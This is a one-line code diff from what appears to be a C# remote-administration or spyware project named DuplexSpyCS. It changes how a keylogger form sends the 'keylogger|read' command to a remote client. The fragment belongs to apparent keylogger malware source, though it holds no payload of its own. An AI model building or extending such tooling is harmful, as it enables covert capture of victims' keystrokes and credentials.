@@ -290,7 +290,7 @@ namespace DuplexSpyCS
             richTextBox1.Tag = 0;
             toolStripStatusLabel1.Text = "Loading...";
 
-            v.encSend(2, 0, "keylogger|read");
+            v.fnSendCommand("keylogger|read");
         }
 
         private void frmKeyLogger_Load(object sender, EventArgs e)
